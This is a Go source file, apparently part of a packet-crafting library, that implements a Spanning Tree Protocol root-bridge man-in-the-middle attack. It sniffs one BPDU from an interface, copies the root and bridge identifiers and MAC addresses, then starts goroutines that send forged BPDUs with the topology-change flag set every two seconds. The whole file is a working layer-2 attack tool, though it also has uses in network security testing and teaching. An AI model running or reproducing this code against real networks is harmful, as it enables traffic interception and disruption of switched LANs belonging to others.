package higherlevel

import (
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/tiagomdiogo/GoPpy/packet"
	"github.com/tiagomdiogo/GoPpy/sniffer"
	"github.com/tiagomdiogo/GoPpy/supersocket"
	"log"
	"sync"
	"time"
)

func stpRootBridgeMitM(iface1 string) {
	var wg sync.WaitGroup
	alive := true

	//Create a sniffer to Sniff a BPDU from any interface
	sniff, err := sniffer.NewSniffer(iface1, "", 10000)
	if err != nil {
		log.Fatal(err)
	}
	packets := sniff.Start().Packets()

	var stpPkt gopacket.Packet

	for pkt := range packets {
		if pkt.Layer(layers.LayerTypeSTP) != nil {
			stpPkt = pkt
			break
		}
	}

	stpLayer := stpPkt.Layer(layers.LayerTypeSTP).(*layers.STP)

	rootMAC := stpLayer.RouteID.HwAddr.String()
	bridgeMAC := stpLayer.BridgeID.HwAddr.String()
	rootID := stpLayer.RouteID.SysID
	bridgeID := stpLayer.BridgeID.SysID

	params := map[string]interface{}{
		"rootmac":   rootMAC,
		"bridgemac": bridgeMAC,
		"rootid":    rootID,
		"bridgeid":  bridgeID,
	}

	for i := 0; i < 2; i++ {
		wg.Add(1)
		go stpRootBridgeHijack(iface1, params, &wg, &alive)
	}

	for {
		select {
		case <-time.After(time.Millisecond * 500):
			if !alive {
				wg.Wait()
				return
			}
		}
	}
}

func stpRootBridgeHijack(iface string, params map[string]interface{}, wg *sync.WaitGroup, alive *bool) {
	defer wg.Done()

	rootID := params["rootid"].(uint16)
	bridgeID := params["bridgeid"].(uint16)
	bridgeMAC := params["bridgemac"].(string)
	rootMAC := params["rootmac"].(string)

	ticker := time.NewTicker(time.Second * 2)
	defer ticker.Stop()

	for *alive {
		select {
		case <-ticker.C:
			// Final BPDU
			pkt := packet.STPLayer()
			pkt.Layer().TC = true
			pkt.SetBridgeMacStr(bridgeMAC)
			pkt.SetBridgeID(bridgeID)
			pkt.SetRootBridgeMacStr(rootMAC)
			pkt.SetRootBridgeID(rootID)

			// Craft BPDU
			pktFinal, err := packet.CraftPacket(pkt.Layer())
			if err != nil {
				log.Fatal(err)
			}

			socket, err := supersocket.NewSuperSocket(iface, "")
			if err != nil {
				log.Fatal(err)
			}
			socket.Send(pktFinal)
			socket.Close()
		}
	}
}
